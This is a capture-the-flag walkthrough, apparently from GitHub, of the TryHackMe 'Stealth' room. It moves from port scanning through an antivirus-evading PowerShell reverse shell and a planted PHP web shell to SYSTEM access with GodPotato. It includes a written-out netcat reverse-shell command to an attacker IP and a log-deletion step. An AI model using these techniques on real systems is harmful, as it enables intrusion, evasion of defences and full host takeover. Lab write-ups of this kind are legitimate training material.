![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b9e62339-da5b-4659-b3d8-5a5e445a935f)

https://tryhackme.com/room/stealth

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

I initiated the enumeration process by conducting a thorough scan of ports and services using Rustscan:

```bash
sudo rustscan -a 10.10.133.171 -- -sC -sV -oN result_nmap
```

```Rust
PORT      STATE SERVICE         REASON          VERSION
139/tcp   open  netbios-ssn     syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?   syn-ack ttl 125
3389/tcp  open  ms-wbt-server   syn-ack ttl 125 Microsoft Terminal Services
| ssl-cert: Subject: commonName=HostEvasion
| Issuer: commonName=HostEvasion
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-28T19:06:15
| Not valid after:  2024-01-27T19:06:15
| MD5:   110c 1c21 e230 b7c7 41f5 4b6a bf2b 9e6a
| SHA-1: 34ad 3702 1a0a 2054 88a9 ea0c 820b da64 b1bd fb56
| -----BEGIN CERTIFICATE-----
| MIIC2jCCAcKgAwIBAgIQMIOcafxeh79B5cu+rs/taDANBgkqhkiG9w0BAQsFADAW
| MRQwEgYDVQQDEwtIb3N0RXZhc2lvbjAeFw0yMzA3MjgxOTA2MTVaFw0yNDAxMjcx
| OTA2MTVaMBYxFDASBgNVBAMTC0hvc3RFdmFzaW9uMIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEA2tUyXSZT7x2YueFMia0tU6xweBIvbwEXw0MBCXtHEf9A
| LqZ6aiwNSsiLeW/kfBsqw6LArZNajuGggR2uj2HLGMn9Yx2RjnMSUaVWlJnB+j7s
| YsgeVOr3Y8rFv0EPD2M6tKEZ7Zh8HoaBifHR3qeNIx+n6YcYmSjb0mUQ5kQso7SS
| L7a9Beya4aynWgHXegaCVP0CcA750BRf1Ax+tjpojoTJOarC0C1QibbDs0s6NbUY
| Z1CakxCRQlENDRau+vqqhRMxlbEfayl1YICTfMe6j3hMnVeYiPjZECt2nSe92i2p
| rnzpdZ4Xbe8tdDzGETQGkBdOCOKPk6/nh80ifpcjBQIDAQABoyQwIjATBgNVHSUE
| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBABB4
| HKrRnIrik9ef1F3Ah6r4FsdpCmZ0vXLNixsqm8IY81fNcRTogc/WFytU9gylcxRk
| LhoUqXwtQhKqMFOKcEh3Kq2+VMUvgxTxvDywFS4S02AlhWtafq8NBm5nfxxubuit
| tRO3fvdQ7mKS2hWvapW9+guEt0zJZI3Ai/C4NIq5WpbLEGSJe6DHUwXaPyFiHNYy
| 5j91hKUWbDnIy4TqiIPjhBjYhrTvi46fbGbqMpHelUGABzJ5LFfGjORMOWA1bRPz
| wuaEP62Dimr42pzbLPIgGTmBwpIXlpKdcydbJnVORxY4AfpLV6ypt2EPYS2TpKbz
| 4Fw5A8aWrShuerOI7mc=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-12-19T10:20:54+00:00; 0s from scanner time.
8000/tcp  open  http            syn-ack ttl 125 PHP cli server 5.5 or later
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 404 Not Found
8080/tcp  open  ssl/http-proxy? syn-ack ttl 125
| http-methods: 
|_  Supported Methods: HEAD
|_http-open-proxy: Proxy might be redirecting requests
8443/tcp  open  ssl/http        syn-ack ttl 125 Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
| SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
47001/tcp open  http            syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc           syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc           syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc           syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc           syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc           syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc           syn-ack ttl 125 Microsoft Windows RPC
49676/tcp open  msrpc           syn-ack ttl 125 Microsoft Windows RPC
Service Info: Host: www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 10517/tcp): CLEAN (Timeout)
|   Check 2 (port 63347/tcp): CLEAN (Timeout)
|   Check 3 (port 59578/udp): CLEAN (Timeout)
|   Check 4 (port 62009/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-12-19T10:19:35
|_  start_date: N/A
```

For web enumeration, I explored the open ports 8000, 8080, and 8443, meticulously examining their content and directory structures:

- Port 8000: PHP cli server 5.5

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/cafdd5bc-bae4-4be1-bf66-da6f38bff8f3)

- Port 8080: Powershell script analyzer

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/314a6502-928e-4a40-b362-cb1c248cfd40)

- Port 8443: Powershell script analyzer

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/94563546-d2f6-48f9-a7a6-2e5bd092d66c)

Despite conducting sub-directory enumeration, no valuable information was discovered:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/9f489d4d-6619-4f9e-a360-ae905016dbd4)

Subsequently, I attempted SMB enumeration with null authentication, but unfortunately, it did not yield any results:Next, I performed SMB enumeration but that didn't worked with null authentication method:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/d3991535-ccb8-49ca-9d90-63bd6f5f6561)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access:

Given the presence of a PowerShell script analyzer on the target system, I attempted to upload various PowerShell scripts for reverse connection. However, the standard PowerShell scripts proved ineffective. Subsequently, I discovered an older yet effective [PowerShell reverse shell](https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1) script that managed to evade antivirus detection.

After uploading and executing this script, I promptly initiated a netcat listener. Soon after, a successful connection was established from the target host:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/88adbd12-4c0b-4075-91c8-1bc4367725dd)

I gained access to the shell with the username "hostevasion\evader."

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### User flag:

After gaining initial access, my next objective was to locate the user flag. Navigating to the "C:\Users\evader\Desktop" directory, I discovered a file named "encodedflag."

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/be7228d3-efc6-4bd8-b9a9-750f7e8325e5)

Examining the content of the file, I encountered base64-encoded text:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/f4c5f367-384a-44b1-807b-8dcf142307ee)

Decoding this content unveiled another URL leading to the flag:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/e372d250-20ef-4f98-abdc-ccfc2022409e)

Upon accessing this URL, a message was displayed:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/e74b446e-b59f-4f90-84ac-c8af3becd093)

Following the hint to remove the log file from the uploads directory, I navigated to "C:\xampp\htdocs\uploads" and identified a "log.txt" file:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/5e196043-a4e3-46b7-bf44-f044c08cfb39)

After removing the log file, I refreshed the URL, revealing the user flag on the webpage: (pwn3d!🙂)

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/8d13e854-e45f-4d00-8b2f-af4b54254e2b)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Privilege escalation:

Upon inspecting the privileges, I noticed a potential restriction, possibly imposed by the PowerShell script executed from the web application. To investigate further, I uploaded a PHP-based [web shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php) into the host, placing it in the "C:\xampp\htdocs" directory.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/de88543d-59d5-4276-ac44-e09569f87821)

With the newly uploaded web shell, I revisited the privilege check and observed an expanded set of privileges compared to what I obtained from the script analyzer.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/9e2e398b-002e-40c2-849c-23fabb6accc2)

I re-uploaded the PowerShell script for a reverse connection to my local host. Upon receiving the reverse shell, I verified the privileges and identified the presence of "SeImpersonate" privileges.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/9a182cf7-6c76-4346-90cf-a34b23ba4896)

Utilizing the SeImpersonate privileges, I employed an exploit from the well-known Potato family [God Potato](https://github.com/BeichenDream/GodPotato) to elevate my privileges.

Executing the following command informed me that I could obtain "Nt Authority" privileges:

```ps
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/72eb8d16-7e57-4252-9f12-331da58e6ba4)

Combining this exploit with netcat, I uploaded the binary and executed netcat using GodPotato. After starting a netcat listener, I ran GodPotato:

```ps
GodPotato-NET4.exe -cmd "C:\xampp\htdocs\nc.exe 10.X.X.X 1337 -e cmd"
```

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/c56acf19-d922-44e9-b331-db0e53e1d379)

This action promptly resulted in a connection from the NT Authority system. Utilizing this access, I finally obtained the Root flag: (pwn3d!🙂)

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/150db000-cc7f-4936-a206-9210267e6803)


